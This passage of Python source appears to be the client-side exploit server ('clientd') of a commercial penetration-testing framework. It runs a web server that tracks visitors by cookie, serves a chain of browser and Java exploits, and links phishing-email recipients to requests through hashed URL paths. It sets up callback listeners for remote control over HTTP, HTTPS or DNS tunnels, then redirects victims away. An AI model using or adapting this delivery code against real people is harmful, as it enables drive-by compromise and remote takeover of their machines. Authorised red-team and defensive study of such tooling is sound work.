        exploit.useSSLMOSDEF     = self.canvasobj.useSSLMOSDEF

        if self.domain and hasattr(exploit, 'clientsideargs'):
            self.log( "[+] Setting domain argument for clientside exploit ...")
            exploit.clientsideargs['domain'] = self.domain
        exploit.link(self.canvasobj)

        if name in self.recon:
            #no need to go forward here.
            return exploit

        # set the right listener for this exploit
        # there are two options here: UNIVERSAL and HTTP[s]

        listeners = exploit.neededListenerTypes()
        if listeners:
            if listeners[0] == canvasengine.UNIVERSAL_MOSDEF:
                exploit.callback = self.canvasobj.callback
            elif listeners[0] == canvasengine.DNSMOSDEF:
                exploit.callback = self.canvasobj.callback
            else:
                #it's HTTP or HTTPS by definition here.
                if not self.canvasobj.http_mosdef_listener:
                    devlog("clientd", "ERROR: Don't have a HTTP MOSDEF listener, but exploit %s selected HTTP MOSDEF!" % exploit.name)
                    #setting None to exploit.callback is always wrong here...
                exploit.callback = self.canvasobj.http_mosdef_listener
        else:
            devlog("clientd", "Module %s did not need any listeners - I hope this is recon!"%name)

        # Added this in case the module needs to spin up its own servers or anything
        # else that needs to be done per-module, but *not* a per-client basis.
        has_init = hasattr(exploit, "clientd_init")
        
        devlog("clientd", "has clientd_init?:" + str(has_init))
        
        if has_init:
            devlog("clientd", "running clientd_init on %s" % name)
            exploit.clientd_init()
            devlog("clientd", "finished running clientd_init on %s" % name)

        return exploit



class ClientSider(BaseHTTPRequestHandler):
    """ the ClientSider exploit server app """

    def __init__(self, loader,
                 log,
                 access_logger = None,
                 spammer = None,
                 static_dir = None,
                 exit_redirect = 'http://www.failblog.org',
                 response_template = None,
                 engine=None,
                 clientd=None):

        """
        init with a CANVAS module loader
        """

        self.loader               = loader
        if log: self.log          = log #log function for general purpose logging - essentially theexploit.log()
        self.access_logger        = access_logger #log function for access logs only
        self.spammer              = spammer
        self.static_dir           = static_dir
        self.exit_redirect        = exit_redirect
        self.response_template    = response_template
        self.js_progress_bar      = "js_progress_bar.js"
        self.js_progress_bar_file = "Resources/js_progress_bar.js"
        self.session_manager      = SessionManager(log=self.log, loader=loader, engine=engine)
        self.clientd              = clientd

        if self.response_template is None:
            self.response_template = DEFAULT_RESPONSE_TEMPLATE

    def log(self, msg):
        """
        Used if there was no log function passed into our init function.
        Just uses devlog for now - we don't want to spam stdout.
        """
        devlog("clientd", "Clientd: %s" % msg)

    ## request stuff ...
    def default_response(self):
        """
        Provide a default response (redirect) for the http server
        IN  : ...
        OUT : ...
        """
        if self.exit_redirect:
            status              = '200 Ok'
            response_headers    = [('Content-type', 'text/html')]
            body                = """<html><head><script language="javascript">
top.location="%(redirect)s";
</script></head><body></body></html>
""" % {'redirect': self.exit_redirect}
        else:
            return self.dont_leave_page()

        return (status, response_headers, body)

    def dont_leave_page(self):
        """
        Java exploits can't leave the page - so here is a minimal place for them to go.
        """
        status              = '200 Ok'
        response_headers    = []
        body                = ''
        return (status, response_headers, body)

    def fohohfoh_response(self):
        """
        Return a 404
        """
        status              = '404 Not Found'
        response_headers    = []
        body                = ''
        return (status, response_headers, body)

    def options_response(self):
        """
        OPTION verbs come in and we always respond the same.
        """
        status = "207 Multi-Status"
        response_headers  = [("Content-Type","text/xml"), \
                             ("DAV", "1, 2"), ("Public", "OPTIONS, GET, PROPFIND"), \
                             ("Allow", "OPTIONS, GET, PROPFIND")]
        body = ''
        return (status, response_headers, body)

    def chained_response(self):
        """
        Redirect to / for the next exploit
        IN  : ...
        OUT : ...
        """
        status              = '302 Redirect'
        response_headers    = [('Content-type', 'text/html'), ('Location', '/')]
        body                = ''
        return (status, response_headers, body)

    def root_frame(self, refresh_rate=200000):
        """
        The root frame of our exploit attempts for a given session
        """
        status           = '200 OK'
        response_headers = [('Content-type', 'text/html')]
        body             = self.response_template

        devlog("clientd", "Serving up root frame with refresh rate = %d" % refresh_rate)

        if refresh_rate:
            response_headers.append(('Refresh', '%d; url=/' % refresh_rate))

        logging.info('Serving a root frame with refresh rate: %d' % refresh_rate)

        return (status, response_headers, body)

    def static_file(self, path):
        fname = path.split('/', 2)[-1]
        fname = os.path.join(self.static_dir, fname)

        status = "200 OK"
        content_type, content_encoding = mimetypes.guess_type(fname)
        response_headers = [('Content-Type', content_type or 'text/html')]
        if content_encoding:
            response_headers.append(('Content-Encoding', content_encoding))

        devlog('clientd', 'serving static file: %s (headers: %s)' % (fname, response_headers))

        try:
            with open(fname, 'rb') as file:
                body = file.read()
        except Exception as e:
            err = 'could not open static file "%s": %s'
            devlog('clientd', err % (fname, e))
            return self.fohohfoh_response()
        return (status, response_headers, body)

    def retrieve_response(self, request_env, session):
        """
        Serve an exploit, return status/response headers, body data
        IN  : WSGI request environment, Session Object
        OUT : ...
        """

        # default response
        status, response_headers, body = self.default_response()

        # check for session success before serving more exploit goodness
        if not session.succeeded():
            # go into module makesploit translation ...
            status, response_headers, body = self.spike_translate(request_env, session)
        else:
            # XXX: what about exploits that need their session to stay alive? :<
            logging.info('Session %s was compromised with: %s ... serving a response that won\'t leave the page' % (session.sid, repr(session.successful_exploit)))
            if (hasattr(session, 'successful_exploit')
                and session.successful_exploit
                and hasattr(session.successful_exploit, 'refresh_rate')
                and session.successful_exploit.refresh_rate == 0):
                # if an exploit has defined a refresh rate of 0, it wants to stay alive
                logging.info('Successful exploit requested keep-alive ...')
                # handle this here ...
                #status, response_headers, body = self.dont_leave_page()

        # check to see if we need to set a cookie for this session
        cookie_header = request_env.get('HTTP_SESSION_COOKIE', None)
        if cookie_header and response_headers:
            # only init session when module decides it wants to play
            response_headers.append(cookie_header)

        return (status, response_headers, body)

    def spike_translate(self, request_env, session):
        """
        Translates to/from CANVAS6 SPIKE based makesploit()
        IN  : WSGI request environment, SessionState object
        OUT : WSGI response
        """
        server_body   = None
        server_header = None
        sid = session.sid

        path = request_env['PATH_INFO']

        # switch to next in list if the refresh kicks in ...
        if path.startswith('/next_in_list'):
            #we hit a timeout - so let's increment our state
            devlog("clientd", "Found next_in_list - incrementing session forcefully!")
            session.increment()

        elif path.startswith('/static'):
            if self.static_dir:
                return self.static_file(path)
            return self.fohohfoh_response()

        # if it's requesting the js progress bar send it back
        elif self.js_progress_bar in path:
            status           = "200 OK"
            response_headers = [('Content-Type','text/html')]
            with open(self.js_progress_bar_file, 'rb') as file:
                body = file.read()

            return (status, response_headers, body)

        client_header     = spkproxy.header(state='SERVER')
        client_header.ssl = False

        # we _have_ to go through addData for SPIKE sanity
        for c in request_env['HTTP_RAW_REQUEST']:
            client_header.addData(c) # this takes care of SPIKE headers
        for header in request_env['HTTP_RAW_HEADERS']:
            for c in header:
                client_header.addData(c)
        fin = '\r\n\r\n'
        for c in fin:
            client_header.addData(c)

        if not client_header.gotGoodHeader():
            logging.info('SPIKE translation failed ... bravely continuing')

        client_body = spkproxy.body()
        if client_header.bodySize() > 0:
            client_body.data = request_env['BODY_DATA']

        devlog("clientd", "Getting response from active exploit for this session!")
        server_header, server_body = session.get_response(client_header, client_body)
        while not server_header:
            if session.state == STATE_DONE:
                devlog("clientd", "Session is done - returning default response!")
                return self.default_response()
            #Exploits return None when they are done with the client!
            devlog("clientd", "Did not get header from session (exploit is done!). Incrementing and re-trying.")
            session.increment()
            server_header, server_body = session.get_response(client_header, client_body)

        # start translating the SPIKE serverheader and serverbody back
        status              = None
        response_headers    = None
        body                = None
        if None not in [server_body, server_header]:
            if int(server_header.status) in self.responses:
                status = ' '.join([server_header.status,
                    self.responses[int(server_header.status)][0]])
            else:
                #just use header.status and header.msg as supplied by user!
                #probably this should be default!
                status = ' '.join([server_header.status, server_header.msg])

            response_headers = []

            for k, v in server_header.headerValuesDict.items():
                # Leave header values in their original state
                h = k.lower()
                if h == 'content-type':
                    # mimetype control from exploit
                    response_headers.append((k, ''.join(v)))
                elif h != 'connection':
                    # hop-by-hop not allowed ...
                    response_headers.append((k, ''.join(v)))

            body = [''.join(server_body.data)]
        else:
            # so we still get a session id and a cookie set
            # if the first exploit in the list returns None
            devlog("clientd", "Sending chained response")
            status, response_headers, body = self.chained_response()

        refresh_rate = getattr(session.current_exploit, 'refresh_rate', 30)
        if refresh_rate:
            response_headers.append(('Refresh', '%d; url=/next_in_list' % refresh_rate))

        return (status, response_headers, body)

    ## wsgi app entry point

    def __call__(self, environ, start_response):
        """
        !!! This is the function that is handling each request. !!!

        WSGI app for handling client side requests.
        IN  : WSGI request environment, start_response() callback
        OUT : response body data

        start_response() takes status and headers as arguments.


        We always add_default_headers(response_headers) before we return
        them out of this function.
        """

        request_env = {}

        for k in environ:
            # parse the env down to the bare essentials
            if k in ['SERVER_PROTOCOL',
                     'REQUEST_METHOD',
                     'PATH_INFO',
                     'QUERY_STRING',
                     'REMOTE_HOST',
                     'REMOTE_ADDR',
                     'CONTENT_TYPE',
                     'CONTENT_LENGTH',
                     'BODY_DATA',
                     'GEOIP_RECORD'] or 'HTTP_' in k:
#                devlog('clientd', '[+] %s: %s' % (k, environ[k]))
                request_env[k] = environ.get(k, '')

        # ignore favicon.ico requests ... they mess up our flow ... dont think
        # there will be a favicon.ico parsing exploit anytime soon, or well I hope ... :>
        if 'PATH_INFO' in request_env and '/favicon.ico' == request_env['PATH_INFO']:
            logging.info('404-ing request for favicon.ico')
            # serve response
            (status, response_headers, body) = self.fohohfoh_response()
            add_default_headers(response_headers)
            start_response(status, response_headers)
            return body

        verb = request_env["REQUEST_METHOD"]
        trigger = "%s=" % self.clientd.session_cookie_name

        #
        # We now check if the current exploit handles OPTIONS request
        # in which case we forward the request and get the response from the module
        # otherwise we provide the default response
        #
        if verb in ["OPTIONS"]:
            if "HTTP_SESSION_COOKIE" in request_env:
                sid = request_env['HTTP_SESSION_COOKIE'][1]
            else:
                sid = request_env['HTTP_COOKIE'].split(trigger)[1]
                # strip off trailing semi-colon and anything behind it
                index = sid.find(";")
                if index != -1:
                    sid = sid[:index]

            session = self.session_manager.get_session(sid)
            if not session:
                session = self.session_manager.new_session(sid, request_env)

            exp_handles_options = getattr(session.current_exploit, 'handles_options', False)
            if exp_handles_options:
                logging.info("Exploit handles OPTIONS, forwarding")
                devlog("clientd", "Handling an OPTIONS request")
                status, response_headers, body = self.retrieve_response(request_env, session)
            else:
                logging.info("Exploit does not handle OPTIONS, default response")
                devlog("clientd", "Responding to default OPTIONS request")
                status, response_headers, body = self.options_response()

            add_default_headers(response_headers)
            start_response(status, response_headers)

            return body

        #then, if the verb is propfind, we need to see who registered this webdav path
        #and send it to them for handling!
        if verb in ["PROPFIND"] or "webdav" in request_env.get("HTTP_USER_AGENT","").lower():
            path_info = request_env["PATH_INFO"]
            for web_dav_directory, session in self.session_manager.getWebDavShares():
                if web_dav_directory in path_info:
                    devlog("clientd", "Found session who handles %s"%web_dav_directory)
                    # Here we get the response from the session object (which is passing it to
                    # the exploit or recon module)
                    status, response_headers, body = self.retrieve_response(request_env, session)
                    add_default_headers(response_headers)
                    start_response(status, response_headers)
                    return body
            devlog("clientd", "We did NOT find a session responsible for %s - this is going to fail badly!"%path_info)
            #404 isn't right, but then nothing is!
            (status, response_headers, body) = self.fohohfoh_response()
            add_default_headers(response_headers)
            start_response(status, response_headers)
            return body

        # In some cases (Java exploits ,etc.) we don't have session cookies, so we send
        # them manually in our QUERY_STRING. (The exploit is responsible for setting the
        # QUERY STRING properly)

        # for when we want to set custom/continued sessions from queries

        if ('QUERY_STRING' in request_env and len(request_env['QUERY_STRING'])):
            qs   = request_env['QUERY_STRING']
            vars = qs.split('&')

            for var in vars:
                if '=' in var:
                    var_name, var_val = var.split('=', 1)
                    if var_name.lower() == 'cansessid' and var_val:
                        # we found a session ID in our QUERY STRING, so let's
                        # set the cookie to match (essentially faking our our session stuff)
                        devlog("clientd", 'Reviving session from query string Session ID!')
                        devlog("clientd", "OLD Cookie: %s" % request_env.get("HTTP_COOKIE","No Cookie"))
                        request_env['HTTP_COOKIE']     = '%s=%s' % (self.clientd.session_cookie_name, var_val)
                        devlog("clientd", 'HTTP_COOKIE: %s' % request_env['HTTP_COOKIE'])
                        # The request could have come in and clientd assigned a new session cookie to it
                        # so here we remove this Set-Cookie call (since it is a duplicate)
                        if 'HTTP_SESSION_COOKIE' in request_env:
                            del request_env['HTTP_SESSION_COOKIE']

        # we always have a session cookie, and if we don't, it's the first request
        # and should have a PATH INFO that gives us the md5sum of the email if we, in fact,
        # used the spammer. If we don't have a HTTP_COOKIE we WILL have a HTTP_SESSION_COOKIE
        # (aka, this is also an indicator of the first request)

        # kick in the request log callback if needed
        if self.access_logger:
            self.access_logger(request_env)

        if 'HTTP_SESSION_COOKIE' in request_env:
            devlog("clientd", "This is the first request for session %s" % (request_env['HTTP_SESSION_COOKIE'],))
            sid = request_env['HTTP_SESSION_COOKIE'][1]
            #sid may look like this: CANSessID=1274559826.61;
            if trigger in sid:
                devlog("clientd","Found trigger in sid")
                index = sid.find(trigger)
                if index != -1:
                    #found Cookie
                    sid = sid[index+len(trigger):]
                    index = sid.find(";")
                    if index != -1:
                        sid=sid[:index]
            else:
                devlog("clientd", "Did not find trigger in sid")

            devlog("clientd", "Starting new SID: %s" % sid)
            session = self.session_manager.new_session(sid, request_env)

            #check to see if we can associate this session with an email!
            path_info=request_env.get('PATH_INFO',"")
            devlog("clientd", "PATH_INFO: %s"%path_info)
            if len(path_info)==33:
                devlog("clientd","Found potential MD5 hash as path_info")
                md5sum = path_info[1:]
                if md5sum in self.spammer.hashdict:
                    mail = self.spammer.hashdict[md5sum]
                    logging.info('target %s correlated to this request' % mail)
                    session.email = mail

            if self.response_template == EXPLOIT_RESPONSE_TEMPLATE:
                # user doesn't want to be discreet
                devlog("clientd", "Serving exploit directly")

                status, response_headers, server_body = self.retrieve_response(request_env, session)
                cookie_header = request_env.get('HTTP_SESSION_COOKIE')
                response_headers.append(cookie_header)
                add_default_headers(response_headers)
                start_response(status, response_headers)
                return server_body

            devlog("clientd", "Serving the root exploit frame")
            status, response_headers, server_body = self.root_frame()
            cookie_header = request_env.get('HTTP_SESSION_COOKIE')
            response_headers.append(cookie_header)
            add_default_headers(response_headers)
            start_response(status, response_headers)
            return server_body
        else:
            # we should already have this session.
            devlog("clientd", "Request env: %s" % repr(request_env))
            devlog("clientd", "Trigger: %s" % trigger)

            sid = request_env['HTTP_COOKIE'].split(trigger)[1]
            #strip off trailing semi-colon and anything behind it
            index=sid.find(";")
            if index!=-1:
                sid=sid[:index]

            devlog("clientd", "We have the session key: %s"%sid)
            session = self.session_manager.get_session(sid)
            #If we do not, there's some kind of weird error!
            if not session:
                logging.warning("Could not find session for %s! Starting new session" % sid)
                devlog("clientd", "Starting new SID: %s"%sid)
                session = self.session_manager.new_session(sid, request_env)
                #now serve the root exploit frame
                status, response_headers, server_body = self.root_frame()
                add_default_headers(response_headers)
                start_response(status, response_headers)
                return server_body

            # Here we get the response from the session object (which is passing it to
            # the exploit or recon module)
            status, response_headers, body = self.retrieve_response(request_env, session)
            add_default_headers(response_headers)
            start_response(status, response_headers)
            return body

class ServerHandler(SimpleHandler):
    """
    Log requests in close (python stdlib)
    """

    server_software = '0.1'

    def close(self):
        """
        Close the connection - but log it first
        """
        #devlog("clientd", "ServerHandler.close() called")
        try:
            self.request_handler.log_request(
                self.status.split(' ',1)[0], self.bytes_sent
            )
        finally:
            #you have to flush here - aka, a shutdown call.
            #this is something that timeoutsock.close() does automatically now.
            SimpleHandler.close(self)


    def write(self, data):
        """
        Write the data, but ignore broken pipes
        """
        #devlog("clientd", "ServerHandler.write() called")
        try:
            return SimpleHandler.write(self, data)
        except Exception:
            devlog("clientd", '*** SimpleHandler write exception (Ignore Broken Pipe) ***')
            raise

# XXX: based on existing python stdlib code for now ...

class MyRequestHandler(BaseHTTPRequestHandler):
    """ customized wsgi compat request handler """

    server_version  = 'WebServer/0.1'
    geoip           = GeoIPSupport()

    def __init__(self, *args, **kwargs):
        self._session_id = None
        BaseHTTPRequestHandler.__init__(self, *args, **kwargs)

    def address_string(self):
        """ don't slow down on dns lookups """
        return str(self.client_address[0])

    def get_session_id(self):
        """
        Simplified cookie based session handling (simplified from apache openid)
        IN  : ...
        OUT : session id
        """
        if self._session_id:
            return self._session_id

        sid = None
        cookie = self.headers.get('Cookie')
        if cookie:
            simple_cookie   = Cookie.SimpleCookie(cookie)
            cookie_crumb    = simple_cookie.get(self.server.cookie_name, None)
            if cookie_crumb:
                sid = cookie_crumb.value

        if not sid:
            sid = str(time.time())
            devlog('clientd', 'new sid: %s' % sid)

        self._session_id = sid
        return sid

    def get_session_cookie_header(self):
        """
        Get cookie header for this session
        IN  : ...
        OUT : Cookie header in WSGI header format
        """
        cookie = '%s=%s;' % (self.server.cookie_name, self.get_session_id())
        return ('Set-Cookie', cookie)

    def get_environ(self):
        """
        WSGI request environment builder
        IN  : ...
        OUT : Custom WSGI request environment handled by app
        """
        env                     = self.server.base_environ.copy()
        env['SERVER_PROTOCOL']  = self.request_version
        env['REQUEST_METHOD']   = self.command
        if '?' in self.path:
            path,query = self.path.split('?',1)
        else:
            path,query = self.path,''

        env['PATH_INFO']    = urllib.unquote(path)
        env['QUERY_STRING'] = query

        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]

        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader

        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length

        for h in self.headers.headers:
            k,v = h.split(':',1)
            k=k.replace('-','_').upper(); v=v.strip()
            if k in env:
                continue
            if 'HTTP_'+k in env:
                env['HTTP_'+k] += ','+v
            else:
                env['HTTP_'+k] = v

        # needed for spike translate
        env['HTTP_RAW_REQUEST'] = self.raw_requestline
        env['HTTP_RAW_HEADERS'] = self.headers.headers
        env['wsgi.input']       = self.rfile
        env['wsgi.errors']      = self.get_stderr()

        # check for any body data (simplified)
        client_body = ''
        if length:
            client_body = env['wsgi.input'].read(int(length))
        env['BODY_DATA'] = client_body

        # simple session id support
        if self.server.cookie_name not in self.headers.get('Cookie', ''):
            #print '[+] starting session management for new client'
            env['HTTP_SESSION_COOKIE'] = self.get_session_cookie_header()
            #http://adamyoung.net/IE-Blocking-iFrame-Cookies
            #Set-Cookie: CanSessId=<SOMETHING>
        else:
            env['HTTP_SESSION_ID'] = self.get_session_id()

        # geoip support
        if self.geoip.GeoIP:
            addr    = env['REMOTE_ADDR']
            gir     = self.geoip.get_geoip(addr)
            if gir:
                env['GEOIP_RECORD'] = gir

        return env

    def get_stderr(self):
        return sys.stderr

    def handle_one_request(self):
        """Handle a single HTTP request"""

        try:
            self.raw_requestline = self.rfile.readline()
        except Timeout:
            devlog('clientd', '[!] handle_one_request() caught Timeout')
            self.raw_requestline = None

        if not self.raw_requestline:
            self.close_connection = 1
            return
        if not self.parse_request():
            return

        # XXX: spawning a worker thread per request is extremely dirty ...
        # XXX: really we want some sort of proper async model ...

        handler = ServerHandler(
            self.rfile, self.wfile, self.get_stderr(), self.get_environ()
        )
        handler.request_handler = self #we do this so they can log for us on close()
        handler.run(self.server.get_app())

# XXX: based on existing python stdlib code for now ...

class MyHTTPServer(ThreadingMixIn, HTTPServer):
    """ customized wsgi compat HTTP server """

    application = None

    def __init__(self,
                 server_address,
                 RequestHandlerClass,
                 listen_queue = 100,
                 cookie_name='CANSessID'):

        self.listen_queue = listen_queue
        self.cookie_name = cookie_name

        # binds and activates ...
        HTTPServer.__init__(self,
                            server_address,
                            RequestHandlerClass)

    def server_bind(self):
        """Override server_bind to store the server name."""
        HTTPServer.server_bind(self)
        self.setup_environ()

    def server_activate(self):
        logging.info('Using listen queue override (%d)' % self.listen_queue)
        self.socket.listen(self.listen_queue)

    def setup_environ(self):
        # Set up base environment
        env = self.base_environ = {}
        env['SERVER_NAME']          = self.server_name
        env['GATEWAY_INTERFACE']    = 'CGI/1.1'
        env['SERVER_PORT']          = str(self.server_port)
        env['REMOTE_HOST']          = ''
        env['CONTENT_LENGTH']       = ''
        env['SCRIPT_NAME']          = ''

    def get_app(self):
        return self.application

    def set_app(self,application):
        self.application = application

class MyHTTPSServer(TLSSocketServerMixIn, MyHTTPServer):
    """ customized wsgi compat HTTPS server """

    ssl         = False
    pkey        = None
    cchain      = None
    scache      = None

    def __init__(self, *args, **kwargs):
        MyHTTPServer.__init__(self, *args, **kwargs)

    def setup_ssl(self, cert_path, key_path):
        """
        Set up TLS Dependencies for SSL Server
        IN  : path to server certificate pem, path to server private key
        OUT : ...
        """
        cert        = open(cert_path, 'rb').read()
        x509        = X509()
        x509.parse(cert)
        self.cchain = X509CertChain([x509])
        key         = open(key_path, 'rb').read()
        self.pkey   = parsePEMKey(key, private=True)
        self.scache = SessionCache()
        self.ssl    = True

    def handshake(self, connection):
        """
        Do ssl handshake when needed
        IN  : TLS Connection
        OUT : True to handle request, False to ignore request
        """
        if self.ssl == False:
            devlog("clientd", "[+] you have to call setup_ssl method before using HTTPS server")
            return False
        try:
            connection.handshakeServer(certChain = self.cchain,
                                       privateKey = self.pkey,
                                       sessionCache = self.scache)
            connection.ignoreAbruptClose = True
            return True
        except TLSError, error:
            devlog("clientd", "[+] TLS handshake error: %s" % str(error))
            return False

class theexploit(Utility):
    def __init__(self):
        Utility.__init__(self)
        self.name=NAME
        self.server_ip      = ''
        self.server_domain  = '' # set this if you have a domain for the server_ip
        self.server_port    = 8080
        self.httpd          = None
        # put exploits with a refresh_rate of 0 last!
        self.allowed_attack_modules        = DEFAULT_ATTACK_MODULES
        # recon modules are run before allowed exploits ...
        self.recon          = []
        self.loader         = None
        self.spam           = False
        self.spammer        = None
        self.dnsmosdef      = False
        self.httpmosdef     = False
        self.useSSL         = False
        self.useSSLMOSDEF   = False
        self.ssl_cert       = os.path.join(canvas_resources_directory, 'server.cert')
        self.ssl_key        = os.path.join(canvas_resources_directory, 'server.pkey')
        self.js_progress_bar= False
        self.direct_response= False
        self.httpproxyport  = 0
        # if this is a string, it will assume file mode
        # e.g. 'targets.txt' would open targets.txt
        # in canvas root dir and expect newline seperated
        # list of target emails
        self.spam_targets   = ['bas@immunityinc.com', 'bas2@immunityinc.com', 'test@sales.immunityinc.com']
        self.spam_template  = ''
        self.spam_from      = ''
        self.spam_subject   = ''
        self.file_choose    = ''
        self.static_dir     = None
        self.redirect       = True
        self.exit_redirect  = 'http://www.failblog.org'
        self.response_template = DEFAULT_RESPONSE_TEMPLATE
        self.response_template_file = None

        # so we get self.callback set correctly in GUI mode ...
        self.listen_queue   = 100
        self.auto_detect_exploits = True #by default, we want to just automatically pick them.
        self.always_do_recon      = True #by default, we want to always run js_recon
        self.http_mosdef_listener = None #remember, can also be https :>
        self.http_mosdef_type     = ''
        self.uni_mosdef_listener  = None
        self.dns_mosdef_listener  = None

        # custom threads callback for special listeners (smb servers, etc.)
        # clientd will check for a 'clientd_thread' method which it expects to return
        # a Thread object that it can call join() on ... this happens from
        # init_listeners ... it expects the clientd_thread method to start the thread
        # in case it needs to do any special init waits etc.

        self.custom_threads = []

        #we set this to false so that canvasengine.runExploit() does
        #not choose our callback for us based on our target!
        self.autoFind = False

        #long printouts of every request
        self.do_debug = False

        self.session_cookie_name = "%sSessID" % randomstring(5)

    def required_arguments(self):
        return ["exit_redirect","server_port", "server_ip", "useSSL","useSSLMOSDEF", "recon","allowed_attack_modules","auto_detect_exploits"]

    def neededListenerTypes(self):
        """
        This module needs two listeners:
        1. A UNIVERSAL MOSDEF listener
        2. An HTTP/S Listener (we set this up internally!)

        These are started by clientd itself on the commandline ...

        We also need to make sure we set our target correctly - which will
        define where our listeners go based on auto-listeners.
        """
        # we only need server_ip
        self.getarg('server_ip')

        if self.server_ip:
            #XXX: this actually affects the Engine globally, which is probably not perfect...
            devlog("clientd", "Setting our callback interface to %s"%self.server_ip)
            interface = self.engine.getLocalNode().interfaces.get_ip(self.server_ip)
            self.engine.set_callback_interface(interface)

        return [canvasengine.UNIVERSAL_MOSDEF]

    def access_log(self, request_env):
        """
        client stats logger callback .

        This is a special function that handles web server logging - not a general
        purpose log function.
        """
        if self.do_debug:
            logging.info('request @ %s' % time.asctime())
            for key in request_env.keys():
                logging.info('%s : %s' % (key, repr(request_env[key])))

    def dump_cmdline(self):
        args = []
        logging.warning('NOTE: commandline clientd is intended to run from within cmdline.py')
        args.append('runmodule clientd')
        if self.callback:
            args.append('-l %s' % self.callback.ip)
        args.append('-O dnsmosdef:%d' % int(self.dnsmosdef))
        args.append('-O httpmosdef:%d' % int(self.httpmosdef))
        args.append('-O httpproxyport:%d' % int(self.httpproxyport))
        args.append('-O ssl:%d' % int(self.useSSL))
        args.append('-O useSSLMOSDEF:%d' % int(self.useSSLMOSDEF))
        args.append('-O ssl_cert:"%s"' % self.ssl_cert)
        args.append('-O ssl_key:"%s"' % self.ssl_key)
        args.append('-O server_port:%d' % int(self.server_port))
        args.append('-O server_ip:%s' % self.server_ip)
        args.append('-O exit_redirect:%s' % self.exit_redirect)
        args.append('-O auto_detect_exploits:%s' %self.auto_detect_exploits)

        allowed = '-O allowed_attack_modules:'
        i = 0
        for mod in self.allowed_attack_modules:
            if i:
                allowed = allowed+','+mod
            else:
                allowed = allowed+mod
                i = 1
        args.append(allowed)

        allowed = '-O allowed_recon_modules:'
        i = 0
        for mod in self.recon:
            if i:
                allowed = allowed+','+mod
            else:
                allowed = allowed+mod
                i = 1

        args.append(allowed)

        args.append('-O spam:%d' % int(self.spam))
        if self.spam == True:
            if type(self.spam_targets) == type([]):
                spam = '-O spam_targets:'
                for email in self.spam_targets:
                    spam = spam+','+email
                args.append(spam)
            else:
                # file mode
                args.append('-O spam_targets:%s' % self.spam_targets)
            args.append('-O spam_from:%s' % self.spam_from)
            args.append('-O spam_subject:"%s"' % self.spam_subject)
            args.append('-O file_choose:"%s"' % self.file_choose)

            #args.append('-O spam_template:"%s"' % self.spam_template)
            logging.warning("NOTE: edit self.spam in spammer for template control")

        args.append('-O listen_queue:%d' % self.listen_queue)

        print ' '.join(args)

    def get_args(self):
        logging.info("Dumping matching commandline configuration options")
        devlog("clientd", "Arguments: %s" % repr(self.argsDict))
        self.getarg("dnsmosdef")
        self.getarg("httpmosdef")
        self.getarg("httpproxyport")
        self.getarg("useSSL")
        self.getarg("useSSLMOSDEF")
        self.getarg("ssl_cert")
        self.getarg("ssl_key")
        self.getarg("server_port")
        self.getarg("server_ip")
        self.getarg("server_domain")
        self.getarg("auto_detect_exploits")
        self.getarg("always_do_recon")
        self.getarg("static_dir")
        self.getarg("redirect")
        self.getarg("js_progress_bar")
        self.getarg("direct_response")
        self.getarg("spam")

        if 'notunnel_value' in self.argsDict:
            # We have to do radio button processing in this way because
            # CANVAS sets the _label_ of the active button inside a radio
            # group as the _value for every button element.
            tunnel_option = self.argsDict['notunnel_value']

            if tunnel_option == 'No Tunneling':
                self.useSSLMOSDEF = False
                self.httpmosdef   = False
                self.dnsmosdef    = False
            elif tunnel_option == 'Use HTTP Tunneling':
                self.useSSLMOSDEF = False
                self.httpmosdef   = True
                self.dnsmosdef    = False
            elif tunnel_option == 'Use HTTPS Tunneling':
                self.useSSLMOSDEF = True
                self.httpmosdef   = True
                self.dnsmosdef    = False
            elif tunnel_option == 'Use DNS Tunneling':
                self.useSSLMOSDEF = False
                self.httpmosdef   = False
                self.dnsmosdef    = True

        self.getarg("response_template_file")
        if self.response_template_file:
            with open(self.response_template_file) as file:
                self.response_template = file.read()
        else:
            self.getarg("response_template")

        if self.js_progress_bar:
            self.response_template = JAVASCRIPT_RESPONSE_TEMPLATE
        elif self.direct_response:
            self.response_template = EXPLOIT_RESPONSE_TEMPLATE

        if self.redirect:
            self.getarg('exit_redirect')
        else:
            self.exit_redirect = ''

        recon = self.argsDict.get('allowed_recon_modules', self.recon)

        if not recon and (self.auto_detect_exploits or self.always_do_recon):
            # automatically add js_recon
            recon = ['js_recon']
        elif isinstance(recon, basestring):
            recon = [m for m in map(str.strip, recon.split(',')) if m]
        self.recon = recon

        # deal with allowed attack and allowed recon module args from GUI
        attack = self.argsDict.get('allowed_attack_modules', self.allowed_attack_modules)
        if isinstance(attack, basestring):
            # if js_recon is here, add it to the recon modules
            if 'js_recon' in attack and 'js_recon' not in self.recon:
                self.recon.append('js_recon')
            attack = [m for m in map(str.strip, attack.split(',')) if (m and m != 'js_recon')]
        self.allowed_attack_modules = attack

        devlog('clientd', 'recon modules: %s' % self.recon)
        devlog('clientd', 'attack modules: %s' % self.allowed_attack_modules)

        # deal with spam args
        self.spam_targets   = self.argsDict.get('spam_targets', self.spam_targets)

        if isinstance(self.spam_targets, basestring):
            if '@' in self.spam_targets:
                self.spam_targets = map(str.strip, self.spam_targets.split(','))

        self.spam_from      = self.argsDict.get('spam_from', self.spam_from)
        self.spam_subject   = self.argsDict.get('spam_subject', self.spam_subject)
        self.spam_template  = self.argsDict.get('spam_template', self.spam_template)
        self.file_choose    = self.argsDict.get('file_choose', self.file_choose)
        self.listen_queue   = int(self.argsDict.get('listen_queue', self.listen_queue))

    def init_dns_mosdef(self):
        """
        Starts an DNS MOSDEF listener - we NEVER close this because
        some random client could still be connected to it.
        """
        logging.info('ClientD using DNS MOSDEF listener ...')

        dns_mosdef_listener = None
        dns_mosdef_type     = canvasengine.DNSMOSDEF

        dns_mosdef_listener = self.engine.autoListener(self, dns_mosdef_type,
                                                       host = self.callback.ip,
                                                       autoFind = False)
        if not dns_mosdef_listener:
            logging.error('Could not start DNS MOSDEF listener')
            logging.error("Something is possibly listening on that port (53) already?")
            return '', None
        else:
            logging.info("Started up DNS MOSDEF listener")

        #set our internal variable here.
        self.dns_mosdef_listener = dns_mosdef_listener

        return dns_mosdef_type, dns_mosdef_listener

    def init_http_mosdef(self):
        """
        Starts an HTTP MOSDEF listener - we NEVER close this because
        some random client could still be connected to it.
        """

